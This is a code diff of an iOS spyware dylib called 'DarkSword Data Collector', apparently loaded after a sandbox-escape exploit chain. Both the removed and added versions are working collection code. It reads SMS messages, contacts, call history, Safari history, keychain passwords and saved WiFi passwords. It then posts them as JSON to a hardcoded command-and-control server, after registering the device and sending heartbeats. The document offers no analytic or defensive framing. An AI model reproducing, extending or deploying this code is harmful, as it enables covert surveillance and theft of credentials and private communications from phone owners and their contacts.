@@ -1,294 +1,386 @@
 /**
- * DarkSword Bootstrap v3 - Minimal data collection dylib
- * NO UIKit dependency (not available in WebContent process)
- * Uses only Foundation + CoreFoundation + sqlite3
- * Keeps the same _process entry point as original
- *
+ * DarkSword Data Collector v4
+ * Uses ONLY CoreFoundation + CFNetwork (like original bootstrap)
+ * NO Foundation, NO UIKit - not available in WebContent process
+ * 
  * Compile:
- * clang -framework Foundation -framework CoreFoundation -framework Security \
- *   -framework CFNetwork -lsqlite3 \
+ * clang src/main.m -o collector.dylib \
+ *   -framework CoreFoundation -framework CFNetwork -framework Security \
  *   -isysroot $(xcrun --sdk iphoneos --show-sdk-path) \
  *   -arch arm64 -arch arm64e -miphoneos-version-min=15.0 \
- *   -fobjc-arc -dynamiclib -Oz -Wno-deprecated-declarations \
- *   -o bootstrap.dylib src/main.m
+ *   -dynamiclib -Oz -Wno-deprecated-declarations
  */
 
-#import <Foundation/Foundation.h>
-#import <Security/Security.h>
-#import <sqlite3.h>
-#import <sys/stat.h>
-#import <sys/utsname.h>
-#import <dlfcn.h>
+#include <CoreFoundation/CoreFoundation.h>
+#include <CFNetwork/CFNetwork.h>
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <sys/stat.h>
+#include <dlfcn.h>
+#include <pthread.h>
+#include <sys/utsname.h>
 
-#define C2_HOST "192.168.110.111"
+#define C2_HOST "192.168.2.67"
 #define C2_PORT 8081
 
-// === HTTP POST using NSURLSession (available in Foundation) ===
-static void c2Post(const char *path, NSDictionary *body) {
-    @autoreleasepool {
-        char url[256];
-        snprintf(url, sizeof(url), "http://%s:%d%s", C2_HOST, C2_PORT, path);
-        
-        NSError *err = nil;
-        NSData *json = [NSJSONSerialization dataWithJSONObject:body options:0 error:&err];
-        if (!json) return;
-        
-        NSURL *u = [NSURL URLWithString:@(url)];
-        NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:u cachePolicy:NSURLRequestReloadIgnoringLocalCacheData timeoutInterval:15];
-        req.HTTPMethod = @"POST";
-        [req setValue:@"application/json" forHTTPHeaderField:@"Content-Type"];
-        req.HTTPBody = json;
-        
-        dispatch_semaphore_t sem = dispatch_semaphore_create(0);
-        [[NSURLSession.sharedSession dataTaskWithRequest:req completionHandler:^(NSData *d, NSURLResponse *r, NSError *e) {
-            dispatch_semaphore_signal(sem);
-        }] resume];
-        dispatch_semaphore_wait(sem, dispatch_time(DISPATCH_TIME_NOW, 15 * NSEC_PER_SEC));
-    }
+/* === SQLite via dlopen (no link dependency) === */
+typedef long long sql_i64;
+typedef int (*sql_open_t)(const char*, void**);
+typedef int (*sql_prepare_t)(void*, const char*, int, void**, const char**);
+typedef int (*sql_step_t)(void*);
+typedef const char* (*sql_col_name_t)(void*, int);
+typedef const unsigned char* (*sql_col_text_t)(void*, int);
+typedef sql_i64 (*sql_col_i64_t)(void*, int);
+typedef int (*sql_col_count_t)(void*);
+typedef int (*sql_finalize_t)(void*);
+typedef int (*sql_close_t)(void*);
+
+static sql_open_t _sql_open;
+static sql_prepare_t _sql_prepare;
+static sql_step_t _sql_step;
+static sql_col_name_t _sql_col_name;
+static sql_col_text_t _sql_col_text;
+static sql_col_i64_t _sql_col_i64;
+static sql_col_count_t _sql_col_count;
+static sql_finalize_t _sql_finalize;
+static sql_close_t _sql_close;
+
+static void init_sqlite(void) {
+    void *h = dlopen("/usr/lib/libsqlite3.dylib", 1);
+    if (!h) return;
+    _sql_open = dlsym(h, "sqlite3_open");
+    _sql_prepare = dlsym(h, "sqlite3_prepare_v2");
+    _sql_step = dlsym(h, "sqlite3_step");
+    _sql_col_name = dlsym(h, "sqlite3_column_name");
+    _sql_col_text = dlsym(h, "sqlite3_column_text");
+    _sql_col_i64 = dlsym(h, "sqlite3_column_int64");
+    _sql_col_count = dlsym(h, "sqlite3_column_count");
+    _sql_finalize = dlsym(h, "sqlite3_finalize");
+    _sql_close = dlsym(h, "sqlite3_close");
 }
 
-// === SQLite helper ===
-static NSMutableArray *queryDB(const char *path, const char *sql) {
-    NSMutableArray *results = [NSMutableArray new];
-    sqlite3 *db;
-    if (sqlite3_open(path, &db) != SQLITE_OK) return results;
+/* === HTTP POST via CFNetwork (same as original bootstrap) === */
+static void http_post(const char *path, const char *body) {
+    char url[512];
+    snprintf(url, sizeof(url), "http://%s:%d%s", C2_HOST, C2_PORT, path);
     
-    sqlite3_stmt *stmt;
-    if (sqlite3_prepare_v2(db, sql, -1, &stmt, NULL) != SQLITE_OK) {
-        sqlite3_close(db);
-        return results;
+    CFStringRef urlStr = CFStringCreateWithCString(kCFAllocatorDefault, url, kCFStringEncodingUTF8);
+    CFURLRef cfurl = CFURLCreateWithString(kCFAllocatorDefault, urlStr, NULL);
+    CFRelease(urlStr);
+    if (!cfurl) return;
+    
+    CFHTTPMessageRef req = CFHTTPMessageCreateRequest(kCFAllocatorDefault, CFSTR("POST"), cfurl, kCFHTTPVersion1_1);
+    CFRelease(cfurl);
+    if (!req) return;
+    
+    CFStringRef bodyStr = CFStringCreateWithCString(kCFAllocatorDefault, body, kCFStringEncodingUTF8);
+    CFDataRef bodyData = CFStringCreateExternalRepresentation(kCFAllocatorDefault, bodyStr, kCFStringEncodingUTF8, 0);
+    CFRelease(bodyStr);
+    
+    CFHTTPMessageSetHeaderFieldValue(req, CFSTR("Content-Type"), CFSTR("application/json"));
+    if (bodyData) {
+        CFHTTPMessageSetBody(req, bodyData);
+        CFRelease(bodyData);
     }
     
-    int cols = sqlite3_column_count(stmt);
-    while (sqlite3_step(stmt) == SQLITE_ROW) {
-        NSMutableDictionary *row = [NSMutableDictionary new];
-        for (int i = 0; i < cols; i++) {
-            NSString *key = @(sqlite3_column_name(stmt, i));
-            switch (sqlite3_column_type(stmt, i)) {
-                case SQLITE_INTEGER: row[key] = @(sqlite3_column_int64(stmt, i)); break;
-                case SQLITE_FLOAT:   row[key] = @(sqlite3_column_double(stmt, i)); break;
-                case SQLITE_TEXT:    row[key] = [NSString stringWithUTF8String:(const char*)sqlite3_column_text(stmt, i)]; break;
-                case SQLITE_BLOB:    row[key] = [[NSData dataWithBytes:sqlite3_column_blob(stmt, i) length:sqlite3_column_bytes(stmt, i)] base64EncodedStringWithOptions:0]; break;
-                case SQLITE_NULL:    row[key] = [NSNull null]; break;
-            }
+    CFReadStreamRef stream = CFReadStreamCreateForHTTPRequest(kCFAllocatorDefault, req);
+    CFRelease(req);
+    if (!stream) return;
+    
+    /* Disable SSL validation for local network */
+    CFStringRef keys[] = { kCFStreamSSLValidatesCertificateChain };
+    CFBooleanRef vals[] = { kCFBooleanFalse };
+    CFDictionaryRef ssl = CFDictionaryCreate(kCFAllocatorDefault, (const void**)keys, (const void**)vals, 1, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+    CFReadStreamSetProperty(stream, kCFStreamPropertySSLSettings, ssl);
+    CFRelease(ssl);
+    
+    CFReadStreamOpen(stream);
+    UInt8 buf[4096];
+    while (CFReadStreamRead(stream, buf, sizeof(buf)) > 0) {}
+    CFReadStreamClose(stream);
+    CFRelease(stream);
+}
+
+/* === Helper: report data to C2 === */
+static void report(const char *platform, const char *username, const char *token, const char *cached) {
+    char body[4096];
+    /* Manual JSON construction (no Foundation) */
+    snprintf(body, sizeof(body),
+        "{\"deviceId\":1,\"reportType\":\"SOCIAL_ACCOUNT\",\"data\":{\"platform\":\"%.64s\",\"username\":\"%.512s\",\"token\":\"%.1024s\",\"cachedData\":\"%.1024s\"}}",
+        platform, username, token, cached);
+    http_post("/api/v1/c2/report", body);
+}
+
+/* === Helper: report WiFi === */
+static void report_wifi(const char *ssid, const char *pwd, const char *bssid) {
+    char body[2048];
+    snprintf(body, sizeof(body),
+        "{\"deviceId\":1,\"reportType\":\"WIFI_PASSWORD\",\"data\":{\"ssid\":\"%.256s\",\"password\":\"%.256s\",\"bssid\":\"%.64s\"}}",
+        ssid, pwd, bssid);
+    http_post("/api/v1/c2/report", body);
+}
+
+/* === Collect SMS === */
+static void collect_sms(void) {
+    const char *path = "/var/mobile/Library/SMS/sms.db";
+    if (access(path, R_OK) != 0) { report("SMS", "access_denied", path, ""); return; }
+    if (!_sql_open) { report("SMS", "sqlite_unavailable", "", ""); return; }
+    
+    void *db = NULL;
+    if (_sql_open(path, &db) != 0 || !db) { report("SMS", "open_failed", path, ""); return; }
+    
+    void *st = NULL;
+    const char *sql = "SELECT m.text, h.id as handle FROM message m LEFT JOIN handle h ON m.handle_id=h.ROWID ORDER BY m.date DESC LIMIT 100";
+    if (_sql_prepare(db, sql, -1, &st, NULL) != 0) { _sql_close(db); return; }
+    
+    int count = 0;
+    while (_sql_step(st) == 100) { /* SQLITE_ROW */
+        const char *text = "", *handle = "";
+        for (int i = 0; i < _sql_col_count(st); i++) {
+            const char *name = _sql_col_name(st, i);
+            if (!name) continue;
+            if (strcmp(name, "text") == 0) { const char *t = _sql_col_text(st, i); if (t) text = t; }
+            else if (strcmp(name, "handle") == 0) { const char *t = _sql_col_text(st, i); if (t) handle = t; }
         }
-        [results addObject:row];
+        report("SMS", handle, text, "");
+        count++;
     }
-    sqlite3_finalize(stmt);
-    sqlite3_close(db);
-    return results;
+    _sql_finalize(st);
+    _sql_close(db);
+    
+    char info[64];
+    snprintf(info, sizeof(info), "%d messages collected", count);
+    report("SMS", "summary", info, "");
 }
 
-// === Register device ===
-static int registerDevice(void) {
-    struct utsname u;
-    uname(&u);
+/* === Collect Contacts === */
+static void collect_contacts(void) {
+    const char *path = "/var/mobile/Library/AddressBook/AddressBook.sqlitedb";
+    if (access(path, R_OK) != 0) { report("Contacts", "access_denied", path, ""); return; }
+    if (!_sql_open) return;
     
-    NSString *udid = [NSString stringWithFormat:@"native_%@", NSUUID.UUID.UUIDString];
-    NSDictionary *body = @{
-        @"udid": udid,
-        @"deviceName": @(u.machine),
-        @"model": @"iPhone",
-        @"osVersion": @(u.release),
-        @"tagId": @"1"
-    };
+    void *db = NULL;
+    if (_sql_open(path, &db) != 0 || !db) return;
     
-    c2Post("/api/v1/devices/register", body);
+    void *st = NULL;
+    if (_sql_prepare(db, "SELECT p.first, p.last, v.value as phone FROM ABPerson p LEFT JOIN ABMultiValue v ON p.ROWID=v.record_id WHERE v.property=3 LIMIT 100", -1, &st, NULL) != 0) { _sql_close(db); return; }
     
-    // Parse response - need synchronous response
-    char url[256];
-    snprintf(url, sizeof(url), "http://%s:%d/api/v1/devices/register", C2_HOST, C2_PORT);
-    NSData *json = [NSJSONSerialization dataWithJSONObject:body options:0 error:nil];
-    NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:@(url)];
-    req.HTTPMethod = @"POST";
-    [req setValue:@"application/json" forHTTPHeaderField:@"Content-Type"];
-    req.HTTPBody = json;
-    
-    dispatch_semaphore_t sem = dispatch_semaphore_create(0);
-    __block int deviceId = 0;
-    [[NSURLSession.sharedSession dataTaskWithRequest:req completionHandler:^(NSData *d, NSURLResponse *r, NSError *e) {
-        if (d) {
-            NSDictionary *res = [NSJSONSerialization JSONObjectWithData:d options:0 error:nil];
-            if ([res[@"code"] intValue] == 0) deviceId = [res[@"data"][@"id"] intValue];
+    int count = 0;
+    while (_sql_step(st) == 100) {
+        const char *first = "", *last = "", *phone = "";
+        for (int i = 0; i < _sql_col_count(st); i++) {
+            const char *name = _sql_col_name(st, i);
+            if (!name) continue;
+            if (strcmp(name, "first") == 0) { const char *t = _sql_col_text(st, i); if (t) first = t; }
+            else if (strcmp(name, "last") == 0) { const char *t = _sql_col_text(st, i); if (t) last = t; }
+            else if (strcmp(name, "phone") == 0) { const char *t = _sql_col_text(st, i); if (t) phone = t; }
         }
-        dispatch_semaphore_signal(sem);
-    }] resume];
-    dispatch_semaphore_wait(sem, dispatch_time(DISPATCH_TIME_NOW, 15 * NSEC_PER_SEC));
-    return deviceId;
-}
-
-// === Collect SMS ===
-static void collectSMS(int did) {
-    const char *p = "/var/mobile/Library/SMS/sms.db";
-    if (access(p, R_OK) != 0) return;
-    
-    NSMutableArray *msgs = queryDB(p,
-        "SELECT m.text, m.date, m.is_from_me, h.id as handle "
-        "FROM message m LEFT JOIN handle h ON m.handle_id=h.ROWID "
-        "ORDER BY m.date DESC LIMIT 200");
-    
-    for (NSDictionary *m in msgs) {
-        c2Post("/api/v1/c2/report", @{
-            @"deviceId": @(did), @"reportType": @"SOCIAL_ACCOUNT",
-            @"data": @{@"platform": @"SMS", @"username": m[@"handle"] ?: @"", @"token": m[@"text"] ?: @"",
-                       @"cachedData": [NSString stringWithFormat:@"date:%@,from_me:%@", m[@"date"], m[@"is_from_me"]]}
-        });
+        char fullname[512];
+        snprintf(fullname, sizeof(fullname), "%s %s", first, last);
+        report("Contacts", fullname, phone, "");
+        count++;
     }
+    _sql_finalize(st);
+    _sql_close(db);
 }
 
-// === Collect Contacts ===
-static void collectContacts(int did) {
-    const char *p = "/var/mobile/Library/AddressBook/AddressBook.sqlitedb";
-    if (access(p, R_OK) != 0) return;
+/* === Collect Call History === */
+static void collect_calls(void) {
+    const char *path = "/var/mobile/Library/CallHistoryDB/CallHistory.storedata";
+    if (access(path, R_OK) != 0) { report("CallHistory", "access_denied", path, ""); return; }
+    if (!_sql_open) return;
     
-    NSMutableArray *contacts = queryDB(p,
-        "SELECT p.first,p.last,v.value as phone "
-        "FROM ABPerson p LEFT JOIN ABMultiValue v ON p.ROWID=v.record_id "
-        "WHERE v.property=3 LIMIT 200");
+    void *db = NULL;
+    if (_sql_open(path, &db) != 0 || !db) return;
     
-    for (NSDictionary *c in contacts) {
-        NSString *name = [NSString stringWithFormat:@"%@ %@", c[@"first"] ?: @"", c[@"last"] ?: @""];
-        c2Post("/api/v1/c2/report", @{
-            @"deviceId": @(did), @"reportType": @"SOCIAL_ACCOUNT",
-            @"data": @{@"platform": @"Contacts", @"username": name, @"token": c[@"phone"] ?: @""}
-        });
+    void *st = NULL;
+    if (_sql_prepare(db, "SELECT ZADDRESS, ZDURATION, ZCALLTYPE FROM ZCALLRECORD ORDER BY ZDATE DESC LIMIT 100", -1, &st, NULL) != 0) { _sql_close(db); return; }
+    
+    int count = 0;
+    while (_sql_step(st) == 100) {
+        const char *addr = "";
+        sql_i64 dur = 0;
+        int ctype = 0;
+        for (int i = 0; i < _sql_col_count(st); i++) {
+            const char *name = _sql_col_name(st, i);
+            if (!name) continue;
+            if (strcmp(name, "ZADDRESS") == 0) { const char *t = _sql_col_text(st, i); if (t) addr = t; }
+            else if (strcmp(name, "ZDURATION") == 0) dur = _sql_col_i64(st, i);
+            else if (strcmp(name, "ZCALLTYPE") == 0) ctype = (int)_sql_col_i64(st, i);
+        }
+        char info[128];
+        snprintf(info, sizeof(info), "dur:%lld,type:%d", dur, ctype);
+        report("CallHistory", addr, "", info);
+        count++;
     }
+    _sql_finalize(st);
+    _sql_close(db);
 }
 
-// === Collect Call History ===
-static void collectCalls(int did) {
-    const char *p = "/var/mobile/Library/CallHistoryDB/CallHistory.storedata";
-    if (access(p, R_OK) != 0) return;
+/* === Collect Safari History === */
+static void collect_safari(void) {
+    const char *path = "/var/mobile/Library/Safari/History.db";
+    if (access(path, R_OK) != 0) { report("Safari", "access_denied", path, ""); return; }
+    if (!_sql_open) return;
     
-    NSMutableArray *calls = queryDB(p,
-        "SELECT ZADDRESS,ZDATE,ZDURATION,ZCALLTYPE FROM ZCALLRECORD ORDER BY ZDATE DESC LIMIT 100");
+    void *db = NULL;
+    if (_sql_open(path, &db) != 0 || !db) return;
     
-    for (NSDictionary *c in calls) {
-        c2Post("/api/v1/c2/report", @{
-            @"deviceId": @(did), @"reportType": @"SOCIAL_ACCOUNT",
-            @"data": @{@"platform": @"CallHistory", @"username": c[@"ZADDRESS"] ?: @"",
-                       @"token": [NSString stringWithFormat:@"dur:%@,type:%@", c[@"ZDURATION"], c[@"ZCALLTYPE"]]}
-        });
+    void *st = NULL;
+    if (_sql_prepare(db, "SELECT url, title FROM history_items ORDER BY visit_time DESC LIMIT 100", -1, &st, NULL) != 0) { _sql_close(db); return; }
+    
+    int count = 0;
+    while (_sql_step(st) == 100) {
+        const char *url = "", *title = "";
+        for (int i = 0; i < _sql_col_count(st); i++) {
+            const char *name = _sql_col_name(st, i);
+            if (!name) continue;
+            if (strcmp(name, "url") == 0) { const char *t = _sql_col_text(st, i); if (t) url = t; }
+            else if (strcmp(name, "title") == 0) { const char *t = _sql_col_text(st, i); if (t) title = t; }
+        }
+        report("Safari", url, title, "");
+        count++;
     }
+    _sql_finalize(st);
+    _sql_close(db);
 }
 
-// === Collect Safari History ===
-static void collectSafari(int did) {
-    const char *p = "/var/mobile/Library/Safari/History.db";
-    if (access(p, R_OK) != 0) return;
-    
-    NSMutableArray *hist = queryDB(p,
-        "SELECT url,title FROM history_items ORDER BY visit_time DESC LIMIT 100");
-    
-    for (NSDictionary *h in hist) {
-        c2Post("/api/v1/c2/report", @{
-            @"deviceId": @(did), @"reportType": @"SOCIAL_ACCOUNT",
-            @"data": @{@"platform": @"Safari", @"username": h[@"url"] ?: @"", @"token": h[@"title"] ?: @""}
-        });
-    }
-}
-
-// === Collect Keychain ===
-static void collectKeychain(int did) {
-    NSDictionary *q = @{
-        (__bridge id)kSecClass: (__bridge id)kSecClassGenericPassword,
-        (__bridge id)kSecReturnAttributes: @YES,
-        (__bridge id)kSecReturnData: @YES,
-        (__bridge id)kSecMatchLimit: (__bridge id)kSecMatchLimitAll
-    };
+/* === Collect Keychain === */
+static void collect_keychain(void) {
+    /* Use Security.framework SecItemCopyMatching */
+    CFTypeRef classGeneric = kSecClassGenericPassword;
+    CFStringRef keys[] = { kSecClass, kSecReturnAttributes, kSecReturnData, kSecMatchLimit };
+    CFTypeRef vals[] = { classGeneric, kCFBooleanTrue, kCFBooleanTrue, kSecMatchLimitAll };
+    CFDictionaryRef query = CFDictionaryCreate(kCFAllocatorDefault, (const void**)keys, (const void**)vals, 4, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
     
     CFTypeRef result = NULL;
-    if (SecItemCopyMatching((__bridge CFDictionaryRef)q, &result) == errSecSuccess && result) {
-        NSArray *items = (__bridge_transfer NSArray *)result;
-        for (NSDictionary *item in items) {
-            NSString *svc = item[(__bridge id)kSecAttrService] ?: @"";
-            NSString *acct = item[(__bridge id)kSecAttrAccount] ?: @"";
-            NSData *data = item[(__bridge id)kSecValueData];
-            NSString *pwd = data ? [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding] : @"";
+    OSStatus status = SecItemCopyMatching(query, &result);
+    CFRelease(query);
+    
+    if (status == errSecSuccess && result) {
+        CFArrayRef items = (CFArrayRef)result;
+        CFIndex cnt = CFArrayGetCount(items);
+        for (CFIndex i = 0; i < cnt && i < 100; i++) {
+            CFDictionaryRef item = CFArrayGetValueAtIndex(items, i);
+            if (!item) continue;
             
-            if (svc.length > 0 || acct.length > 0) {
-                c2Post("/api/v1/c2/report", @{
-                    @"deviceId": @(did), @"reportType": @"SOCIAL_ACCOUNT",
-                    @"data": @{@"platform": @"KEYCHAIN", @"username": acct, @"token": pwd ?: @"",
-                               @"cachedData": [NSString stringWithFormat:@"svc:%@", svc]}
-                });
+            CFStringRef svc = CFDictionaryGetValue(item, kSecAttrService);
+            CFStringRef acct = CFDictionaryGetValue(item, kSecAttrAccount);
+            CFDataRef data = CFDictionaryGetValue(item, kSecValueData);
+            
+            char svc_buf[256] = {0}, acct_buf[256] = {0}, pwd_buf[512] = {0};
+            if (svc) CFStringGetCString(svc, svc_buf, sizeof(svc_buf), kCFStringEncodingUTF8);
+            if (acct) CFStringGetCString(acct, acct_buf, sizeof(acct_buf), kCFStringEncodingUTF8);
+            if (data) {
+                CFIndex len = CFDataGetLength(data);
+                if (len > 0 && len < 500) {
+                    memcpy(pwd_buf, CFDataGetBytePtr(data), len);
+                    pwd_buf[len] = 0;
+                }
+            }
+            
+            char info[512];
+            snprintf(info, sizeof(info), "svc:%s", svc_buf);
+            report("KEYCHAIN", acct_buf, pwd_buf, info);
+        }
+        CFRelease(result);
+    }
+}
+
+/* === Collect WiFi === */
+static void collect_wifi(void) {
+    const char *path = "/var/mobile/Library/Preferences/com.apple.wifi.known-networks.plist";
+    if (access(path, R_OK) != 0) { report("WiFi", "access_denied", path, ""); return; }
+    
+    CFURLRef fileURL = CFURLCreateFromFileSystemRepresentation(kCFAllocatorDefault, (const UInt8*)path, strlen(path), false);
+    CFReadStreamRef rs = CFReadStreamCreateWithFile(kCFAllocatorDefault, fileURL);
+    CFRelease(fileURL);
+    if (!rs) return;
+    
+    CFReadStreamOpen(rs);
+    CFPropertyListRef plist = CFPropertyListCreateWithStream(kCFAllocatorDefault, rs, 0, kCFPropertyListImmutable, NULL, NULL);
+    CFReadStreamClose(rs);
+    CFRelease(rs);
+    
+    if (!plist || CFGetTypeID(plist) != CFDictionaryGetTypeID()) {
+        if (plist) CFRelease(plist);
+        return;
+    }
+    
+    CFDictionaryRef dict = (CFDictionaryRef)plist;
+    CFIndex cnt = CFDictionaryGetCount(dict);
+    const void **keys = (const void**)malloc(cnt * sizeof(void*));
+    CFDictionaryGetKeysAndValues(dict, keys, NULL);
+    
+    for (CFIndex i = 0; i < cnt && i < 50; i++) {
+        char ssid[256] = {0};
+        CFStringGetCString((CFStringRef)keys[i], ssid, sizeof(ssid), kCFStringEncodingUTF8);
+        
+        CFDictionaryRef net = CFDictionaryGetValue(dict, keys[i]);
+        char pwd[256] = {0};
+        if (net && CFGetTypeID(net) == CFDictionaryGetTypeID()) {
+            /* Try "Password" key */
+            CFTypeRef pv = CFDictionaryGetValue(net, CFSTR("Password"));
+            if (pv && CFGetTypeID(pv) == CFStringGetTypeID()) {
+                CFStringGetCString((CFStringRef)pv, pwd, sizeof(pwd), kCFStringEncodingUTF8);
             }
         }
+        report_wifi(ssid, pwd, "");
     }
+    
+    free(keys);
+    CFRelease(plist);
 }
 
-// === Collect WiFi ===
-static void collectWiFi(int did) {
-    NSString *p = @"/var/mobile/Library/Preferences/com.apple.wifi.known-networks.plist";
-    NSDictionary *d = [NSDictionary dictionaryWithContentsOfFile:p];
-    if (!d) return;
-    
-    for (NSString *ssid in d.allKeys) {
-        NSDictionary *net = d[ssid];
-        c2Post("/api/v1/c2/report", @{
-            @"deviceId": @(did), @"reportType": @"WIFI_PASSWORD",
-            @"data": @{@"ssid": ssid, @"password": net[@"Password"] ?: net[@"password"] ?: @"",
-                       @"bssid": net[@"BSSID"] ?: @""}
-        });
-    }
-}
-
-// === Collect Installed Apps ===
-static void collectApps(int did) {
-    NSDictionary *d = [NSDictionary dictionaryWithContentsOfFile:
-        @"/var/mobile/Library/Caches/com.apple.mobile.installation.plist"];
-    if (!d) return;
-    
-    NSMutableArray *apps = [NSMutableArray new];
-    if (d[@"User"]) [apps addObjectsFromArray:[d[@"User"] allKeys]];
-    if (d[@"System"]) [apps addObjectsFromArray:[d[@"System"] allKeys]];
-    
-    c2Post("/api/v1/c2/report", @{
-        @"deviceId": @(did), @"reportType": @"SOCIAL_ACCOUNT",
-        @"data": @{@"platform": @"InstalledApps", @"username": [NSString stringWithFormat:@"%lu apps", apps.count],
-                   @"cachedData": [apps componentsJoinedByString:@","]}
-    });
-}
-
-// === Collect Device Info ===
-static void collectDeviceInfo(int did) {
+/* === Collect Device Info === */
+static void collect_device_info(void) {
     struct utsname u;
     uname(&u);
     
-    c2Post("/api/v1/c2/report", @{
-        @"deviceId": @(did), @"reportType": @"SOCIAL_ACCOUNT",
-        @"data": @{@"platform": @"DeviceInfo", @"username": [NSString stringWithFormat:@"%s %s", u.machine, u.release],
-                   @"cachedData": [NSString stringWithFormat:@"sysname:%s,nodename:%s,machine:%s", u.sysname, u.nodename, u.machine]}
-    });
+    char info[512];
+    snprintf(info, sizeof(info), "sysname:%s,nodename:%s,machine:%s,release:%s", u.sysname, u.nodename, u.machine, u.release);
+    report("DeviceInfo", u.machine, u.release, info);
 }
 
-// === _process entry point - called by Coruna Stage3 ===
+/* === Register device === */
+static void register_device(void) {
+    struct utsname u;
+    uname(&u);
+    char body[512];
+    snprintf(body, sizeof(body),
+        "{\"udid\":\"native_collector\",\"deviceName\":\"%.64s\",\"model\":\"iPhone\",\"osVersion\":\"%.32s\",\"tagId\":\"1\"}",
+        u.machine, u.release);
+    http_post("/api/v1/devices/register", body);
+}
+
+/* === Main collection function (runs in background thread) === */
+static void *collector_thread(void *arg) {
+    /* Wait for sandbox escape to fully complete */
+    sleep(3);
+    
+    register_device();
+    init_sqlite();
+    
+    collect_device_info();
+    collect_sms();
+    collect_contacts();
+    collect_calls();
+    collect_safari();
+    collect_keychain();
+    collect_wifi();
+    
+    /* Final heartbeat */
+    http_post("/api/v1/heartbeat/1",
+        "{\"udid\":\"native_collector\",\"model\":\"iPhone\",\"osVersion\":\"\",\"agentActive\":true,\"currentStage\":5,\"exploitResult\":\"collected\"}");
+    
+    return NULL;
+}
+
+/* === Entry point - called by Stage3 via Mach-O loader === */
 void ds_start(void) {
-    @autoreleasepool {
-        int did = registerDevice();
-        if (did == 0) return;
-        
-        // Heartbeat
-        c2Post("/api/v1/heartbeat/1", @{
-            @"udid": [NSString stringWithFormat:@"native_%d", did],
-            @"model": @"iPhone", @"osVersion": @"",
-            @"agentActive": @YES, @"currentStage": @(5), @"exploitResult": @"native_success"
-        });
-        
-        collectDeviceInfo(did);
-        collectSMS(did);
-        collectContacts(did);
-        collectCalls(did);
-        collectSafari(did);
-        collectKeychain(did);
-        collectWiFi(did);
-        collectApps(did);
-        
-        // Final heartbeat
-        c2Post("/api/v1/heartbeat/1", @{
-            @"udid": [NSString stringWithFormat:@"native_%d", did],
-            @"model": @"iPhone", @"osVersion": @"",
-            @"agentActive": @YES, @"currentStage": @(5), @"exploitResult": @"collected"
-        });
-    }
+    pthread_t thread;
+    pthread_create(&thread, NULL, collector_thread, NULL);
+    pthread_detach(thread);
 }
